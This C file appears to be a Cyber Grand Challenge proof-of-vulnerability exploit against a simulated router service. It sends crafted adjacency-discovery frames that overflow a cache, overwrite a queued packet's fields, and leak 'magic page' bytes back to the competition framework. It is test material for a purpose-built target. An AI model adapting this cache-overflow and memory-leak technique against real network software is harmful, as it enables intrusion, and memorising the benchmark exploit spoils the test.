/*

Author: Joe Rogers <joe@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libcgc.h>
#include "headers.h"

#define EBP (5)

unsigned char decoded_magic_page[500];

void memcpy(unsigned char *Dst, unsigned char *Src, uint32_t Len) {
	uint32_t i;
	for (i = 0; i < Len; i++) {
		Dst[i] = Src[i];
	}
}

void bzero(unsigned char *Buf, uint32_t Len) {
	uint32_t i;
	for (i = 0; i < Len; i++) {
		Buf[i] = 0;
	}
}

unsigned int ReadBytes(int fd, unsigned char *buf, unsigned int len) {
	unsigned int total_bytes = 0;
	size_t rx_bytes;
	char c;

	while (total_bytes < len) {
		if (receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

unsigned int ReadUntil(int fd, char delim, char *buf, unsigned int maxlen) {
	unsigned int total_bytes = 0;
	size_t rx_bytes;
	char c;

	while (total_bytes < maxlen-1) {
		if (receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		if (c == delim) {
			break;
		}
		buf[total_bytes++] = c;
	}
	buf[total_bytes] = '\0';

	return(total_bytes);
}

unsigned int SendBytes(int fd, unsigned char *buf, unsigned int len) {
	size_t tx_bytes;
	unsigned int total_bytes = 0;

	while (total_bytes < len) {
		if (transmit(fd, buf+total_bytes, 1, &tx_bytes) != 0) {
			return(0);
		}
		if (tx_bytes != 1) {
			return(0);
		}
		total_bytes++;
	}

	return(total_bytes);
}

unsigned int pov_strlen(char *buf) {
	unsigned int len = 0;
	while (*(buf+len) != '\0') {
		len++;
	}
	return(len);
}

void NegotiateType2Pov(unsigned int *type2_addr, unsigned int *type2_size, unsigned int *type2_length) {
	unsigned int PovType = 2;

	// Request Type 2 negotitation
	if (SendBytes(3, (unsigned char *)&PovType, 4) != 4) {
		_terminate(-1);
	}

	// get the 4-byte value for type2_addr
	if (ReadBytes(3, (unsigned char *)type2_addr, 4) != 4) {
		_terminate(-1);
	} 
	// get the 4-byte value for type2_size
	if (ReadBytes(3, (unsigned char *)type2_size, 4) != 4) {
		_terminate(-1);
	} 
	// get the 4-byte value for type2_length
	if (ReadBytes(3, (unsigned char *)type2_length, 4) != 4) {
		_terminate(-1);
	} 

	return;

}

#define L2_HDR_LEN (7)
#define L3_HDR_LEN (10)
#define L4_HDR_LEN (3)
#define L2_FTR_LEN (4)
#define L2_ADJ_LEN (8)

uint32_t Checksum(unsigned char *Frame) {
	uint32_t Sum = 0;
	uint8_t i;
	pL2Hdr pL2 = (pL2Hdr)(Frame);

	for (i = 0; i < L2_HDR_LEN+pL2->Len; i++) {
		Sum += Frame[i];
	}

	return(Sum);
}

uint8_t BuildL2Frame(uint16_t L2Dst, uint16_t L2Src, uint8_t Vlan, unsigned char *Frame) {
	pL2Hdr pL2 = (pL2Hdr)(Frame);	
	pL3Hdr pL3 = (pL3Hdr)(Frame+L2_HDR_LEN);
	uint32_t Sum;

	pL2->Dst = L2Dst;
	pL2->Src = L2Src;
	pL2->Len = pL3->Len+L3_HDR_LEN+L2_FTR_LEN;
	pL2->NxtHdr = L3_HEADER_TYPE;
	pL2->Vlan = Vlan;

	Sum = Checksum(Frame);

	memcpy(Frame+L2_HDR_LEN+L3_HDR_LEN+pL3->Len, (unsigned char *)&Sum, 4);

	return(L2_HDR_LEN+pL2->Len);
}

uint8_t BuildL3Packet(uint32_t L3Dst, uint32_t L3Src, unsigned char *Frame) {
	pL3Hdr pL3 = (pL3Hdr)(Frame+L2_HDR_LEN);
	pL4Hdr pL4 = (pL4Hdr)(Frame+L2_HDR_LEN+L3_HDR_LEN);
	
	pL3->Dst = L3Dst;
	pL3->Src = L3Src;
	pL3->Len = pL4->Len+L4_HDR_LEN;
	pL3->NxtHdr = L4_HEADER_TYPE;

	return(L3_HDR_LEN+pL3->Len);

}

uint8_t BuildL4Segment(unsigned char L4Dst, unsigned char L4Src, unsigned char *Data, uint8_t DataLen, unsigned char *Frame) {
	pL4Hdr pL4 = (pL4Hdr)(Frame+L2_HDR_LEN+L3_HDR_LEN);

	pL4->Dst = L4Dst;
	pL4->Src = L4Src;
	pL4->Len = DataLen;
	memcpy(Frame+L2_HDR_LEN+L3_HDR_LEN+L4_HDR_LEN, Data, DataLen);

	return(L4_HDR_LEN+pL4->Len);

}

uint8_t BuildAdpRequest(uint32_t L3AdpAddr, uint16_t L2Src, uint8_t Vlan, unsigned char *Frame) {
	pL2Hdr pL2 = (pL2Hdr)(Frame);	
	pL2Adjacency pL2Adj = (pL2Adjacency)(Frame+L2_HDR_LEN);
	uint32_t Sum;

	// ADP Packet
	pL2Adj->L3Addr = L3AdpAddr;
	pL2Adj->L2Addr = 0;
	pL2Adj->Age = 0;
	pL2Adj->Vlan = 0;

	// L2 Frame
	pL2->Dst = 0xffff;
	pL2->Src = L2Src;
	pL2->Len = L2_ADJ_LEN+L2_FTR_LEN;
	pL2->NxtHdr = L2_ADJACENCY_DISCOVERY_TYPE;
	pL2->Vlan = Vlan;

	Sum = Checksum(Frame);

	memcpy(Frame+L2_HDR_LEN+L2_ADJ_LEN, (unsigned char *)&Sum, 4);

	return(L2_HDR_LEN+L2_ADJ_LEN+L2_FTR_LEN);

}

uint8_t BuildAdpResponse(uint32_t L3AdpAddr, uint32_t L2AdpAddr, uint16_t L2Dst, uint16_t L2Src, uint8_t Vlan, unsigned char *Frame) {
	pL2Hdr pL2 = (pL2Hdr)(Frame);	
	pL2Adjacency pL2Adj = (pL2Adjacency)(Frame+L2_HDR_LEN);
	uint32_t Sum;

	// ADP Packet
	pL2Adj->L3Addr = L3AdpAddr;
	pL2Adj->L2Addr = L2AdpAddr;
	pL2Adj->Age = 0;
	pL2Adj->Vlan = 0;

	// L2 Frame
	pL2->Dst = L2Dst;
	pL2->Src = L2Src;
	pL2->Len = L2_ADJ_LEN+L2_FTR_LEN;
	pL2->NxtHdr = L2_ADJACENCY_RESPONSE_TYPE;
	pL2->Vlan = Vlan;

	Sum = Checksum(Frame);

	memcpy(Frame+L2_HDR_LEN+L2_ADJ_LEN, (unsigned char *)&Sum, 4);

	return(L2_HDR_LEN+L2_ADJ_LEN+L2_FTR_LEN);

}

#define MAX_FRAME_SIZE (255)
#define ECHO_L4ADDR (7)
#define PWDGEN_L4ADDR (129)
#define FRAMEWORK (3)

int main(void) {
	unsigned int type2_addr;
	unsigned int type2_size;
	unsigned int type2_length;
	unsigned char Frame[MAX_FRAME_SIZE];
	uint8_t Len;
	uint8_t EchoLen;
	pL2Hdr pL2 = (pL2Hdr)Frame;
	uint8_t i;
	fd_set readfds;
	int readyfds;
	struct timeval timeout;
	unsigned char *magic_bytes;

	// negotiate a Type2 POV with the Competition Framework
	NegotiateType2Pov(&type2_addr, &type2_size, &type2_length);

	// force the pov to sleep letting the router and cb_3 processes
	// exchange their echo packets so that SendQueue[0] has the desired
	// Frame data
	FD_ZERO(&readfds);
	FD_SET(STDIN, &readfds);
	timeout.tv_sec = 2;
	timeout.tv_usec = 0;
	fdwait(STDIN+1, &readfds, NULL, &timeout, NULL);

	// send 13 gratuitous ADP packets for different L3Addr's
	uint32_t L3Addr = 0x0a010110;
	for (i = 0; i < 13; i++, L3Addr++) {
		bzero(Frame, MAX_FRAME_SIZE);
		Len = BuildAdpResponse(L3Addr, 0x1001, 0x0001, 0x1000, 0, Frame);
		SendBytes(STDOUT, Frame, Len);
	}

	// send one more ADP which will overwrite SendQueue[0]
	//
	// the L3addr of the ADP header should point to a L3Addr that
	// has been previously populated in the router's ADP cache
	//
	// the L2Addr of the ADP header should overwrite the 1-byte Valid
	// with a non-zero value and the 1-byte Age field with 0xfe.
	bzero(Frame, MAX_FRAME_SIZE);
	Len = BuildAdpResponse(0x0a010102, 0x0001, 0x0001, 0x1000, 0, Frame);
	//                                   ^ ^
	//                                Age| |Valid
	SendBytes(STDOUT, Frame, Len);

	// Send enough packets to the original L3Addr we populated in the router's
	// ADP to cause it to age out.
	// The router will forward it back to VLAN 1, but to an unknown unicast L2Addr
	// so the switch will drop it
	for (i = 0; i < 8; i++) {
		bzero(Frame, MAX_FRAME_SIZE);
	        BuildL4Segment(ECHO_L4ADDR, 0x41, (unsigned char *)"AA", 2, Frame);
	        BuildL3Packet(L3Addr-1, 0x0a010102, Frame);
	        EchoLen = BuildL2Frame(0x0001, 0x1000, 0, Frame);
	        SendBytes(STDOUT, Frame, EchoLen);
	}

	// Finally, create ADP entry for the addr we over-wrote
	// allowing the queued packet to be sent
	bzero(Frame, MAX_FRAME_SIZE);
	Len = BuildAdpResponse(0x0a010102, 0x1000, 0x0001, 0x1000, 0, Frame);
	SendBytes(STDOUT, Frame, Len);

	// read in the ADP frame that'll be sent before the target frame
	bzero(Frame, MAX_FRAME_SIZE);
	ReadBytes(STDIN, Frame, sizeof(L2Hdr)+sizeof(L2Adjacency)+4);
	
	// see if we have a packet to read 
	FD_ZERO(&readfds);
	FD_SET(STDIN, &readfds);
	timeout.tv_sec = 2;
	timeout.tv_usec = 0;
	if (fdwait(STDIN+1, &readfds, NULL, &timeout, &readyfds) != 0) {
		SendBytes(STDOUT, (unsigned char *)"diedie!", 7);
		bzero(Frame, MAX_FRAME_SIZE);
		SendBytes(FRAMEWORK, Frame, 4);
		_terminate(0);	
	}
	if (readyfds == 0) {
		SendBytes(STDOUT, (unsigned char *)"diedie!", 7);
		bzero(Frame, MAX_FRAME_SIZE);
		SendBytes(FRAMEWORK, Frame, 4);
		_terminate(0);	
	}

	// read the forwarded frame
	bzero(Frame, MAX_FRAME_SIZE);
	ReadBytes(STDIN, Frame, sizeof(L2Hdr)+sizeof(L3Hdr)+sizeof(L4Hdr)+4+4);
	
	// send the recovered page bytes to the competition framework
	magic_bytes = Frame+sizeof(L2Hdr)+sizeof(L3Hdr)+sizeof(L4Hdr);
	SendBytes(FRAMEWORK, magic_bytes, 4);

}
